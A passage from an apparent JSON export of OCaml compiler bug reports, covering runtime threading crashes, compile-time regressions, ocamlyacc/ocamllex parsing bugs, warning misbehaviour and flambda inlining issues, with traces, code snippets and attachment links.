call this function after calling `caml_main`. Initialization is already protected against duplicate initializations. Other C threads unknown to the runtime still invoke `caml_c_thread_register`.\n\n## Steps to reproduce\n\nThe test case has 2 pthreads calling into OCaml code. Since the access is not protected by the runtime lock, errors are seen.\r\n\r\nUntar the attachment and run `make`. Run `./app.native`. You should see:\r\n\r\n....\r\n[0x7f610fe8a700] expected=10 seen=0\r\n[0x7f610fe8a700] expected=10 seen=0\r\n[0x7f610fe8a700] expected=10 seen=0\r\n[0x7f6111143700] expected=10 seen=1\r\n[0x7f610fe8a700] expected=10 seen=1\r\n[0x7f610fe8a700] expected=10 seen=1\r\n[0x7f610f689700] expected=10 seen=0\r\n[0x7f6111143700] expected=10 seen=1\r\n[0x7f610fe8a700] expected=10 seen=0\r\n[0x7f610fe8a700] expected=10 seen=1\r\n[0x7f6111143700] expected=10 seen=0\r\n[0x7f610fe8a700] expected=10 seen=1\r\n[0x7f610fe8a700] expected=10 seen=1\r\n[0x7f6111143700] expected=10 seen=1\r\n....\r\n\r\nwhich indicates errors. This can be \"fixed\" by uncommenting the first line in `caml_stubs.ml`:\r\n\r\n```\r\nlet _ = Threads.self\r\n```\r\n\r\nif you recompile and run the program again, none of the errors are seen.\n\n## File attachments\n\n- [ocaml-thread-init.tar.gz](https://gist.githubusercontent.com/vicuna/4a8302f85d19b71c0ca6cf6466dd9a62/raw/4c52bebf61bba2d9e35fd8a91b1f675ddd662591/ocaml-thread-init.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7457\n**Reporter:** chetmurthy\n**Assigned to:** @xavierleroy\n**Status:** resolved (set by @xavierleroy on 2017-01-27T13:14:54Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** Intel x86-64 (amd64)\n**OS:** Ubuntu 16.04.1 LTS\n**OS Version:** 16.04.1\n**Version:** 4.04.0\n**Target version:** 4.04.1+dev\n**Fixed in version:** 4.04.1+dev\n**Category:** runtime system and C interface\n**Related to:** #7486\n**Monitored by:** @yallop\n\n## Bug description\n\n(1) I have a rather multithreaded, networked system with many C libs glued in.  It's been running correctly on ocaml 4.02.3 for many months.\r\n\r\n(2) The failure is of a unit-test runner, so some interprocess comms, lots of crypto, but no actual off-machine networking.\r\n\r\n(3) This failure is very, very reproducible.  It happens with 4.03.0, 4.04.0 (both byte & native).  IT DOES NOT happen with 4.02.3.\r\n\r\nIf you have any suggestions for how I might help narrow down (e.g., if you have a pointer to where I can get access to the source-code repository, so I could do bisection-search in the code-repo, I'm happy to do that).  I have the reproduction process almost-automated, so while bisection will be time-consuming, it will be labor-free.\n\n## Steps to reproduce\n\nBuild and run my unit-test.  I realize this is a bit vague, and I'm going to work to narrow this down, but I figured I should report it, since it might be known, and also, since it only shows up with ocaml > 4.02.3, that might point to where the problem arises.\r\n\r\nAlso, I ran both with and without valgrind, on both 4.02.3 and 4.04.0.  On 4.02.3, I get no significant valgrind errors (so it's not as if there's a latent error, but not crashing).  With 4.04.0, of course I get a failure, and then I run with valgrind to get better crash info.\n\n## Additional information\n\nHere's some information I got from valgrind at the point where the failure occurs.  There are many more messages, but there's no point in my sending these in, I suspect, until I can simplify the test.  This output came from a run with a native executable.\r\n\r\n.==11710== Invalid read of size 1\r\n==11710==    at 0x527A6B1: pthread_mutex_destroy (pthread_mutex_destroy.c:30)\r\n==11710==    by 0xFD42E0: caml_thread_reinitialize (in /home/chet/Hack/IL/infraledger/src/il-replica/_build/peer0_unit_tests.native)\r\n==11710==    by 0x709C945: fork (fork.c:211)\r\n==11710==    by 0xFD5C18: unix_fork (in /home/chet/Hack/IL/infraledger/src/il-replica/_build/peer0_unit_tests.native)\r\n==11710==    by 0xF2315A: camlUnix__system_1846 (unix.ml:868)\r\n==11710==    by 0x7E2890: camlTest_util__reset_unit_2674 (test_util.ml:27)\r\n==11710==    by 0x7E2921: camlTest_util__setup_unit_dir_2888 (test_util.ml:36)\r\n==11710==    by 0x80118B: camlPeer0_test_utils__master_test_inner_69265 (peer0_test_utils.ml:308)\r\n==11710==    by 0x8260CB: camlOUnitRunner__fun_2459 (oUnitRunner.ml:46)\r\n==11710==    by 0x81B97F: camlOUnitTest__section_ctxt_1435 (oUnitTest.ml:129)\r\n==11710==    by 0x825F70: camlOUnitRunner__run_one_test_1382 (oUnitRunner.ml:41)\r\n==11710==    by 0x826281: camlOUnitRunner__iter_1582 (oUnitRunner.ml:87)\r\n==11710==  Address 0x7de6110 is 16 bytes inside a block of size 40 free'd\r\n==11710==    at 0x4C2EDEB: free (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\r\n==11710==    by 0xFE6358: caml_finalize_channel (io.c:398)\r\n==11710==    by 0xFE0645: caml_empty_minor_heap (minor_gc.c:381)\r\n==11710==    by 0xFE0AB5: caml_gc_dispatch (minor_gc.c:438)\r\n==11710==    by 0xFE1C40: caml_alloc_string (alloc.c:100)\r\n==11710==    by 0xF3B025: camlBuffer__resize_1232 (buffer.ml:70)\r\n==11710==    by 0xF3B15B: camlBuffer__add_substring_1242 (buffer.ml:87)\r\n==11710==    by 0xF5A314: camlFormat__format_pp_token_1355 (format.ml:343)\r\n==11710==    by 0xF5A905: camlFormat__advance_loop_1394 (format.ml:473)\r\n==11710==    by 0xF5A969: camlFormat__advance_left_1400 (format.ml:480)\r\n==11710==    by 0x82524D: camlOUnitDiff__fun_1812 (oUnitDiff.ml:94)\r\n==11710==    by 0xF35C2C: camlSet__iter_1430 (set.ml:321)\r\n==11710==  Block was alloc'd at\r\n==11710==    at 0x4C2DB8F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\r\n==11710==    by 0xFD3AC2: st_mutex_create (in /home/chet/Hack/IL/infraledger/src/il-replica/_build/peer0_unit_tests.native)\r\n==11710==    by 0xFD3DE7: caml_io_mutex_lock (in /home/chet/Hack/IL/infraledger/src/il-replica/_build/peer0_unit_tests.native)\r\n==11710==    by 0xFE748D: caml_ml_output_bytes (io.c:660)\r\n==11710==    by 0xF276FE: camlPervasives__output_1206 (pervasives.ml:335)\r\n==11710==    by 0x962B51: camlTFramedTransport__fun_2149 (TFramedTransport.ml:99)\r\n==11710==    by 0x911DCD: camlInvoker__fun_3330 (Invoker.ml:482)\r\n==11710==    by 0x7BFAB5: camlReplicaDB__thunk_10433 (ReplicaDB.ml:275)\r\n==11710==    by 0xD67DEC: camlCore_kernel__Exn__protectx_3197 (exn.ml:45)\r\n==11710==    by 0x7C02EB: camlReplicaDB__fun_62944 (exn.ml:54)\r\n==11710==    by 0xD67DEC: camlCore_kernel__Exn__protectx_3197 (exn.ml:45)\r\n==11710==    by 0xD67DEC: camlCore_kernel__Exn__protectx_3197 (exn.ml:45)\r\n==11710==\n\n## File attachments\n\n- [001-harden-io-mutex-free.patch](https://gist.githubusercontent.com/vicuna/f095fafa554fa8a4f60b030cd25bf2a0/raw/394b33a75222fbb5fe14afc116e3e4bd96b7bf79/001-harden-io-mutex-free.patch)\n- [foo](https://gist.githubusercontent.com/vicuna/f095fafa554fa8a4f60b030cd25bf2a0/raw/00b69a0264e249126aaeec67a5caff1200b42a22/foo)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7456\n**Reporter:** @kayceesrk\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2017-03-10T10:21:02Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** major\n**Platform:** x86-64\n**OS:** Ubuntu\n**OS Version:** 16.04\n**Version:** 4.04.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** misc\n**Monitored by:** @gasche @ygrek\n\n## Bug description\n\nWhile trying to reproduce the issue #7452, I noticed that the compilation with 4.04.0 takes twice as long as compiling the same file with 4.03.0. I've attached the timing info:\r\n\r\n4.03.0\r\n-------\r\nall: 31.864s\r\nparsing(test.ml): 0.544s\r\ntyping(test.ml): 2.516s\r\ntransl(test.ml): 0.476s\r\ngenerate(test.ml): 28.324s\r\ncmm(sourcefile(test.ml)): 0.572s\r\ncompile_phrases(sourcefile(test.ml)): 23.968s\r\nselection(sourcefile(test.ml)): 1.696s\r\ncomballoc(sourcefile(test.ml)): 0.176s\r\ncse(sourcefile(test.ml)): 1.036s\r\ndeadcode(sourcefile(test.ml)): 0.600s\r\nspill(sourcefile(test.ml)): 2.548s\r\nliveness(sourcefile(test.ml)): 2.664s\r\nsplit(sourcefile(test.ml)): 1.008s\r\nregalloc(sourcefile(test.ml)): 12.932s\r\nlinearize(sourcefile(test.ml)): 0.204s\r\nemit(sourcefile(test.ml)): 0.980s\r\nscheduling(sourcefile(test.ml)): 0.012s\r\nassemble(sourcefile(test.ml)): 0.004s\r\n\r\nreal\t1m7.576s\r\nuser\t1m6.860s\r\nsys\t0m0.540s\r\n\r\n4.04.0\r\n-------\r\nall: 82.040s\r\nparsing(test.ml): 0.560s\r\ntyping(test.ml): 2.480s\r\ntransl(test.ml): 0.516s\r\ngenerate(test.ml): 78.480s\r\ncmm(sourcefile(test.ml)): 0.552s\r\ncompile_phrases(sourcefile(test.ml)): 30.496s\r\nselection(sourcefile(test.ml)): 1.812s\r\ncomballoc(sourcefile(test.ml)): 0.256s\r\ncse(sourcefile(test.ml)): 1.268s\r\ndeadcode(sourcefile(test.ml)): 0.716s\r\nspill(sourcefile(test.ml)): 3.088s\r\nsplit(sourcefile(test.ml)): 1.656s\r\nliveness(sourcefile(test.ml)): 3.576s\r\nregalloc(sourcefile(test.ml)): 16.236s\r\nlinearize(sourcefile(test.ml)): 0.356s\r\nemit(sourcefile(test.ml)): 1.316s\r\nscheduling(sourcefile(test.ml)): 0.000s\r\nassemble(sourcefile(test.ml)): 0.004s\r\n\r\nreal\t2m19.632s\r\nuser\t2m18.336s\r\nsys\t0m1.140s\n\n## Steps to reproduce\n\nRequires opam package extprot to be installed. \r\n\r\n* Download and untar https://caml.inria.fr/mantis/file_download.php?file_id=1658&type=bug to get test.ml\r\n* Compile as: time ocamlfind opt -c -g -bin-annot -ccopt -g -ccopt -O2 -ccopt -Wextra -ccopt '-Wstrict-overflow=5' -thread -w +a-4-40..42-44-45-48-58 -w -27-32 -package extprot test.ml -o test.cmx\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7455\n**Reporter:** dobenour\n**Status:** acknowledged (set by @xavierleroy on 2017-02-19T16:59:08Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** bikal\n\n## Bug description\n\nocamllex and ocamlyacc both fail to check for balanced parentheses in code blocks.  This allows for invalid OCaml code to be generated.  In the case of ocamlyacc, it might be possible to break the type system due to the use of Obj in the generated code, though I don't think so.\n\n## File attachments\n\n- [conflict.mly](https://gist.githubusercontent.com/vicuna/3e6f72b23f9d561ef5dcfa4b82bfbe53/raw/883a36012e078b4d66eacc54642ff3bf22ee731f/conflict.mly)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7454\n**Reporter:** dobenour\n**Assigned to:** @dra27\n**Status:** resolved (set by @Octachron on 2017-08-06T21:33:22Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @gasche\n\n## Bug description\n\nocamlyacc mishandles raw string literals, such as in the attached (correct) file\n\n## Steps to reproduce\n\nRun ocamlyacc on attached file\n\n## File attachments\n\n- [conflict.mly](https://gist.githubusercontent.com/vicuna/deae52a99627a626756b0e9ac30d72cc/raw/a32c608f256dbc545b69b2b555c4085f51c11649/conflict.mly)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7453\n**Reporter:** @yallop\n**Assigned to:** @diml\n**Status:** assigned (set by @diml on 2017-01-13T17:39:51Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** toplevel\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nRecursive type definitions are incorrectly displayed as explicitly non-recursive definitions:\r\n\r\n    # #show list;;\r\n    type nonrec 'a list = [] | (::) of 'a * 'a list\r\n    # type t = T of t;;\r\n    type t = T of t\r\n    # #show t;;\r\n    type nonrec t = T of t\r\n\r\nAnd recursive module definitions are incorrectly displayed as implicitly non-recursive definitions:\r\n\r\n    # module rec M : sig type t val x : M.t end = struct type t = int let x = 0 end;;\r\n    module rec M : sig type t val x : M.t end\r\n    # #show_module M;;\r\n    module M : sig type t val x : M.t end\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7452\n**Reporter:** enguerrand\n**Assigned to:** @mshinwell\n**Status:** closed (set by @mshinwell on 2017-06-09T17:02:32Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** crash\n**Platform:** Linux\n**OS:** Debian\n**Version:** 4.03.0\n**Target version:** later\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche @ygrek @yallop @alainfrisch\n\n## Bug description\n\nWhile switching a 4.02.3 codebase to 4.03 recently, we stumbled upon some random crashes from the compiler, and more rarely, occurrences of bad assembly code being generated (which as failed to compile), or instruction being trapped at runtime while the compiler is running.\r\n\r\nThose problems occurs on an OCaml source file generated using the Extprot library.\r\n\r\nThe problem doesn't seems to happen all the time.\r\nMost of the time, the file will compile successfully, and if enough retries are given, the compiler will then crash, example of returns from dmesg after a few crashes:\r\n\r\n[22241.838551] ocamlopt.opt[48175]: segfault at ffffffffffde7768 ip 000055f75e412e3c sp 00007ffc3ee31de0 error 7 in ocamlopt.opt[55f75e0b6000+613000]\r\n[22985.879907] ocamlopt.opt[48221]: segfault at af8 ip 00005564455169bd sp 00007ffc9f36b130 error 4 in ocamlopt.opt[556445006000+613000]\r\n[23936.341126] ocamlopt.opt[48306]: segfault at 5837 ip 00005641554a16c8 sp 00007ffe1278f8e0 error 4 in ocamlopt.opt[56415514a000+613000]\r\n[25395.780978] ocamlopt.opt[48445]: segfault at ffffffffffde7608 ip 0000557e25ea5cf4 sp 00007ffc2eac79d0 error 5 in ocamlopt.opt[557e25b49000+613000]\r\n\r\nBacktraces obtained for those crashes give us informations which doesn't seems to show always the same thing. Example backtraces can be found in the attached archive.\r\n\r\nThe compiler will more rarely generated an assembly file that as won't be able to compile:\r\n\r\n/tmp/camlasmc92578.s: Assembler messages:\r\n/tmp/camlasmc92578.s:1005308: Error: operand type mismatch for `add'\r\n\r\nWhere the line 1005308 is: add    $2300, $5199\r\n\r\nOr:\r\n\r\n/tmp/camlasm601e1c.s: Assembler messages:\r\n/tmp/camlasm601e1c.s:820172: Error: operand type mismatch for `or'\r\n\r\nWhere the line 820172 is: orq     $139950828249720, %rax\r\n\r\nWe haven't noticed as of now any misbehaviour in a successfully compiled and running instance of this file, but the issue is still very new for us so we will be watching it closely.\n\n## Steps to reproduce\n\nThe problem doesn't seems to happen all the time, at least it doesn't crash at every build. We sometimes don't witness the crash before 30 minutes of retries.\r\n\r\nSteps to reproduce:\r\n\r\nOCaml 4.03 and 4.04 has been witnessed as triggering the problem.\r\nSample file is attached as the test case used to reproduce the problem: Extprot library must be installed in order to compile the file, since it was generated using Extprot. (we use the latest version from Opam)\r\n\r\nTest case can be found in the attachment (test.ml)\r\n\r\nTo reproduce:\r\nJust compile this file, preferably in a loop, with this command:\r\n\r\nwhile ocamlfind opt -c -g -bin-annot -ccopt -g -ccopt -O2 -ccopt -Wextra -ccopt '-Wstrict-overflow=5' -thread -w +a-4-40..42-44-45-48-58 -w -27-32 -package extprot test.ml -o  test.cmx; do echo \"ok\"; done\n\n## Additional information\n\n- If the crash doesn't occur for some time, after it occured again at least once, the probability of the compiler crashing seems to be increasing\r\n\r\n- Crash was witnessed running ocamlopt and ocamlopt.opt\n\n## File attachments\n\n- [major_gc_clang3.9_O1.s](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/ee2b28aa36fd89227e652219bfd815410611cf51/major_gc_clang3.9_O1.s)\n- [major_gc_clang3.9_O2.s](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/0a89a5b726f7c14dafa8e754db0c7327c4150d46/major_gc_clang3.9_O2.s)\n- [major_gc_with_intnat_cast_o2.s](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/7378461c4f357f61ccf850e6fc28e80a5b1c7050/major_gc_with_intnat_cast_o2.s)\n- [major_gc_without_cast_o2.patch](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/f81c547ae246b0d49064d6f6a67b5f0f08e0e74f/major_gc_without_cast_o2.patch)\n- [opt.patch](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/b9229188cfaff7084cffc346859dbe3753f9fade/opt.patch)\n- [opt.s](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/545f7e726b1bc0861cceaa19b821385008fae3d0/opt.s)\n- [report.tar.xz](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/f022767a9999c013dd12d1375f0684d9b089c9e1/report.tar.xz)\n- [test.diff](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/55e8271cf302a9c2bd7aa3772105c8a40cca6058/test.diff)\n- [unopt.s](https://gist.githubusercontent.com/vicuna/30fc0acfe2d6c32032aafc005312cd11/raw/165d719ce71cfb6e9f0c5d3c975814b309db2f62/unopt.s)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7451\n**Reporter:** @fpottier\n**Assigned to:** @maranget\n**Status:** closed (set by @maranget on 2017-01-05T10:29:41Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** MacOS\n**OS Version:** darwin15\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Has duplicate:** #7471\n\n## Bug description\n\nThe code below, compiled with ocaml 4.04,\r\ntriggers the following warning:\r\n\r\n  Warning 4: this pattern-matching is fragile.\r\n  It will remain exhaustive when constructors are added to type expr.\r\n\r\nYet, as far as I can see, the pattern matching is not fragile.\r\nAdding a new constructor to the type \"expr\" would make it nonexhaustive.\r\n\r\nThis is all the more ironic since the [@@unboxed] annotation indicates that we do *not* intend to add a new constructor to this type.\r\n\r\nRemoving the [@@unboxed] annotation causes the warning to disappear (which seems correct).\r\n\r\nIs this indeed a bug? Or am I mis-understanding something?\r\n\r\nF.\n\n## Steps to reproduce\n\ntype expr_node =\r\n  EConst\r\n\r\ntype expr =\r\n  E of expr_node [@@unboxed]\r\n\r\nlet f (E e) = e\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7449\n**Reporter:** markghayden\n**Assigned to:** @chambart\n**Status:** assigned (set by @chambart on 2017-01-03T20:59:28Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** AMD64\n**OS:** MacOS\n**OS Version:** 10.12.2\n**Version:** 4.04.0\n**Category:** middle end (typedtree to clambda)\n**Tags:** flambda\n**Monitored by:** @gasche @ygrek\n\n## Bug description\n\nSee the attached code.  The [to_string] function is inlined at all call sites, even with no optimization specified at the command line (!?!).  Note that each call site includes a full copy of the jump table and all the jump branches.  The test case here has 30 items.  I've seen this with larger cases (300 items).  Maybe I'm missing something, but it seems this is really off here since this behavior can result in significant code growth.  A work-around is to annotate with '[@inline never]'.\n\n## Steps to reproduce\n\nCompile with 4.04.0 or 4.05.0.dev trunk.  Note that for 4.05.0.dev, the lookup table is used if all the return values are constants and perhaps that is OK to inline.  Added a [failwith] for one of the cases forces the use of jump tables, at least on AMD64.\r\n\r\n  ocamlopt  -c -S du.ml\n\n## Additional information\n\nSee attached ML file.  Assembler output will follow.\n\n## File attachments\n\n- [du.ml](https://gist.githubusercontent.com/vicuna/733c0e55d549bc98266f7120833c7ed1/raw/cfb34474ec5add4608232604d68dc9ad17debfa6/du.ml)\n- [du.s](https://gist.githubusercontent.com/vicuna/733c0e55d549bc98266f7120833c7ed1/raw/533850dce9799aa42b01200713ca8cbbba009034/du.s)\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7447\n**Reporter:** @yallop\n**Assigned to:** @chambart\n**Status:** resolved (set by @mshinwell on 2017-03-10T16:48:39Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** back end (clambda to assembly)\n**Tags:** patch\n**Related to:** #7231\n**Monitored by:** @stedolan\n\n## Bug description\n\nThis issue was originally reported by stedolan under 7231 (where there's some discussion), but it deserves its own PR, since it's a different problem.  Here's stedolan's report:\r\n\r\n\r\n    This seems like a thorny issue. How does the patch handle the following?\r\n\r\n        # let rec r = (let rec x = `A r and y = fun () -> x in y);;\r\n        val r : unit -> [> `A of 'a ] as 'a = <fun>\r\n        # let (`A x) = r () in x ();;\r\n        Segmentation fault\r\n\r\n    Note that in this example, the right-hand sides of each equation are more sensible, since no value is eliminated during its definition (the suspicious 'y ()' from the original test case has been removed).\r\n\r\n    (The polymorphic variant `A is used to allow recursive types, you can also try this example using plain variants and -rectypes.) \r\n\r\n    (ocaml/ocaml#7231#c15819)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7446\n**Reporter:** markghayden\n**Status:** acknowledged (set by @gasche on 2017-01-01T19:32:56Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.04.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** standard library\n**Monitored by:** bikal @ygrek\n\n## Bug description\n\nUnix.gettimeofday allocates a floating point value instead of returning an unboxed float similar to Sys.time.\r\n\r\nUnix.gettimeofday is not really in the standard library, but is included as part of the Ocaml distribution.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7443\n**Reporter:** @gasche\n**Assigned to:** @Octachron\n**Status:** resolved (set by @gasche on 2016-12-29T19:08:47Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** typing\n**Related to:** #7386\n**Monitored by:** @rixed\n\n## Bug description\n\nThe following code fails to compile with \"-w @a\" (setting all warnings as errors):\r\n\r\n  module M = struct\r\n    type t = { x : int; y : int }\r\n  end\r\n\r\n  let sum : M.t -> int = function\r\n    | M.{ x; y } -> x + y\r\n\r\nThe compiler complains that the opening \"M.\" in the pattern M.{ x; y } is unused. But if I remove \"M.\", with the warning-as-errors setting, I still get a compilation error!\r\n\r\nI believe that access to a module record field for disambiguation purposes should be counted as a \"use\" of this module. One might argue that this needs not be the case if neither warnings 40 or 42 are set, but I would personally still count it as a \"use\" in those cases -- I want to be able to write code that respects the 40-as-an-error principle even if 40 is not an error or even not set.\n\n## Additional information\n\nThis issue can easily be worked around by writing the pattern { M.x; y } instead, but I personally find M.{ x; y } more elegant and, beside, the warning behavior may surprise innocent bystanders -- hence it is arguably a usability bug.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7439\n**Reporter:** markghayden\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-12-22T18:48:43Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** AMD64 (others)\n**OS:** MacOS\n**OS Version:** 10.12.2\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** back end (clambda to assembly)\n\n## Bug description\n\nWhen pattern matching constant values, the optimizer uses jump tables even if all the resulting values are themselves constants.  Now that Ocaml is so much better about identifying constants, wouldn't it be better to use lookup tables when the results are all constants.   The examples below all use jump-tables where each target simply loads a constant value and returns.\r\n\r\n\r\ntype t = A | B | C | D ;;\r\n\r\nlet f = function\r\n  | A -> 0\r\n  | B -> 1\r\n  | C -> 2\r\n  | D -> 3\r\n;;\r\n\r\nlet g = function\r\n  | A -> \"A\"\r\n  | B -> \"B\"\r\n  | C -> \"C\"\r\n  | D -> \"D\"\r\n;;\r\n\r\nlet h v =\r\n  match v with\r\n  | A -> f\r\n  | B -> (fun _ -> 1)\r\n  | C -> (fun _ -> 2)\r\n  | D -> (fun _ -> 3)\r\n;;\n\n## Steps to reproduce\n\nCompile above code with 4.04.0+flambda with \"-O3 -unbox-closures\"\n\n## File attachments\n\n- [jt.ml](https://gist.githubusercontent.com/vicuna/c5c2f4193797f85f314dfbfa40573e58/raw/eb9406a0496aa8f4d045ab1a05c17ade8ec3a7cf/jt.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7438\r\n**Reporter:** @avsm\r\n**Assigned to:** @alainfrisch\r\n**Status:** resolved (set by @alainfrisch on 2017-02-20T09:35:17Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** major\r\n**Version:** 4.04.0\r\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Category:** typing\r\n**Related to:** #6985\r\n**Monitored by:** @gasche\r\n\r\n## Bug description\r\n```\r\n# #warnings \"+34\";;\r\n# module type S = sig type t = private [> `Foo] end;;\r\nmodule type S = sig type t = private [> `Foo ] end\r\n# module type X = sig type t = private [> `Foo | `Bar] include S with type t := t end;;\r\nWarning 34: unused type t#row.\r\nmodule type X = sig type t = private [> `Bar | `Foo ] end\r\n```\r\nThe `t#row` should not expose the row variable here, and the warning+34 shouldn't be triggered.\r\n\r\n## Additional information\r\n\r\nFound by Thomas Gazagnaire during https://github.com/mirage/mirage/pull/743\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7437\n**Reporter:** @avsm\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-12-26T07:57:37Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\ntype t = [` Closed ];;\r\ntype nonrec t = private [> t];;\r\n\r\nRunning this through \"ocaml foo.ml\" on 4.04.0:\r\n\r\nFatal error: exception File \"typing/typedecl.ml\", line 454, characters 26-32: Assertion failed\r\n\r\nNo exception with \"ocamlc -i\":\r\n\r\nocamlc -i t.ml\r\nFile \"t.ml\", line 2, characters 12-13:\r\nError: Multiple definition of the type name t.\r\n       Names must be unique in a given structure or signature\n\n## Additional information\n\nFound by Thomas Gazagnaire during https://github.com/mirage/mirage/pull/743\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7436\n**Reporter:** @Drup\n**Status:** resolved (set by @xavierleroy on 2017-02-19T17:20:44Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.04.0\n**Category:** typing\n**Monitored by:** @Drup\n\n## Bug description\n\nWhen encountering a with constraints, signatures are expanded in Types.module_type (indeed, there is no Mty_with ..). Same for \"module type of\".\r\n\r\nThis cause issues for libraries with a big API surface that is instantiated several time. Tyxml is such example. In the file [1] which can be found in eliom, the same (big) signature is copied 6 time. The size of the resulting cmi is 2.0Mo. The size is such that it slows compilation notably (See [2]).\r\n\r\nOne solution, which we are probably going to adopt, is to factor the module type out and share it among the various instances. It's possible in this case since most constraints are the same. \r\n\r\nIt would be nice if the cmi format could be compact in this case, by storing the with constraints.\r\n\r\n[1]: https://github.com/ocsigen/eliom/blob/master/src/lib/eliom_content.client.mli\r\n[2]: https://github.com/ocsigen/eliom/issues/437\n\n## Steps to reproduce\n\nAn easy test case, using tyxml alone (compiled with `ocamlfind ocamlc -package tyxml -c foo.ml`).\r\n\r\n```\r\nmodule type Foo =\r\n  Html_sigs.Make(Tyxml.Xml)(Tyxml.Svg).T\r\n```\r\nthe cmi file is 622o \r\n\r\n\r\n```\r\nmodule type Foo =\r\n  Html_sigs.Make(Tyxml.Xml)(Tyxml.Svg).T\r\n  with type 'a wrap = 'a \r\n```\r\nthe cmi file is 199Ko\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7435\n**Reporter:** khm\n**Assigned to:** @mshinwell\n**Status:** acknowledged (set by @mshinwell on 2017-03-07T12:51:15Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** x86_64\n**OS:** Linux\n**OS Version:** Fedora 25\n**Version:** 4.04.0\n**Category:** back end (clambda to assembly)\n**Monitored by:** nekketsuuu @gasche\n\n## Bug description\n\nocamlbuild -classic-display -no-ocamlfind  `./build/camlp4-byte-only.sh`\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlopt.opt unix.cmxa -I /home/khm/.opam/4.04.0+spacetime/lib/ocamlbuild /home/khm/.opam/4.04.0+spacetime/lib/ocamlbuild/ocamlbuildlib.cmxa myocamlbuild_config.ml myocamlbuild.ml /home/khm/.opam/4.04.0+spacetime/lib/ocamlbuild/ocamlbuild.cmx -o myocamlbuild\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamldep.opt -modules camlp4/boot/camlp4boot.ml > camlp4/boot/camlp4boot.ml.depends\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamldep.opt -modules camlp4/boot/Camlp4.ml > camlp4/boot/Camlp4.ml.depends\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamldep.opt -modules camlp4/config/Camlp4_config.mli > camlp4/config/Camlp4_config.mli.depends\r\ncp /home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/warnings.cmi camlp4/import/warnings.cmi\r\ncp 